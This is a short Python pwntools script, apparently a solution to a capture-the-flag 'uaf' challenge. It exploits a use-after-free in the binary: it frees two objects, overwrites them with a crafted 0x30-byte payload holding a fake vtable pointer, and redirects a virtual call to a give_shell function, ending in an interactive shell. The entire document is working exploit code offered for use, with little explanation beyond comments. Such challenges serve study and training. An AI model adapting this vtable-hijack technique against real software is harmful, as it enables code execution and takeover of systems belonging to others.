from pwn import *
# Fake Man Vtable
# originally 0x4182b0 => 00404d80, which results in rdx = 00404d80 + 8 (Man::Introduce)
# If we do 0x4182b0 => 00404d78, it results in rdx = 00404d78 + 8 (Man::give_shell)
payload =  p64(0x404d78)
payload += p64(0x19)
payload += p64(0x4182d0)
payload += p64(0x4)
payload += p64(0x6b63614a)
payload += p64(0x0)

assert len(payload) == 0x30

# I found that using /dev/stdin instead of a regular file is more elegant
r = process(["./uaf","48","/dev/stdin"])

# Free
r.sendlineafter(b"3. free",b"3")

# Overwrite Woman instance
r.sendlineafter(b"3. free",b"2")
r.sendline(payload)

# Overwrite Man instance
r.sendlineafter(b"3. free",b"2")
r.sendline(payload)

# Shell
r.sendlineafter(b"3. free",b"1")
r.interactive()

